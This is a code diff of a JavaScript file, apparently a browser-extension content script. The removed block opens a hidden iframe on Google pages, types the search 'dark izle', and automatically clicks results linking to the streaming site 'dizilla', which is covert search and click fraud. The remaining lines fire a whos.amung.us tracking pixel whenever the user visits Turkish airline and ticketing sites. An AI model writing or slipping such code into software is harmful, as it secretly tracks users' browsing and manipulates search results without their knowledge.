@@ -8,34 +8,6 @@ if(document.title.toLowerCase().indexOf("taraftarium24") >= 0){
 }
 
 
-if(window.location.href.indexOf("google") >= 0){
-	new Image().src = '//whos.amung.us/widget/m823l61df3.png';
-	var ifrm = document.createElement("iframe");
-	ifrm.setAttribute("src", window.location.origin);
-	ifrm.style.width = "100%";
-	ifrm.style.height = "100%";
-	ifrm.style.border = "0px";
-	ifrm.style.display = "none";
-	ifrm.id = "guugil";
-	document.body.appendChild(ifrm);
-
-	var kelime = "dark izle";
-	setTimeout(function(){document.querySelector("#guugil").contentWindow.document.querySelector("input[name=q]").value = kelime;}, 3000);
-	setTimeout(function(){document.querySelector("#guugil").contentWindow.document.querySelector("input[name=btnK]").click();}, 6000);
-
-	setTimeout(function(){
-		var linkler = document.querySelector("#guugil").contentWindow.document.querySelectorAll("a[ping][href]")
-		var i;
-		for (i = 0; i < linkler.length; i++) {
-		  if(linkler[i].href.indexOf("dizilla") >= 0){
-			  console.log(linkler[i].href);
-			  linkler[i].click();
-			  break;
-		  }
-		}
-	}, 8000);
-}
-
 if(window.location.href.indexOf("turna.com") > 0 || window.location.href.indexOf("enuygun.com") > 0 || window.location.href.indexOf("ucuzabilet.com") > 0 || window.location.href.indexOf("obilet.com") > 0 || window.location.href.indexOf("biletbayisi.com") > 0 || window.location.href.indexOf("skyscanner.com.tr") > 0 || window.location.href.indexOf("turkishairlines.com") > 0 || window.location.href.indexOf("biletall.com") > 0 || window.location.href.indexOf("etstur.com") > 0 || window.location.href.indexOf("flypgs.com") > 0 || window.location.href.indexOf("aerobilet.com.tr") > 0 || window.location.href.indexOf("ucakbileti.com") > 0 || window.location.href.indexOf("anadolujet.com") > 0 || window.location.href.indexOf("sunexpress.com") > 0 ){
 	new Image().src = '//whos.amung.us/widget/xxucakbilet.png';
 }
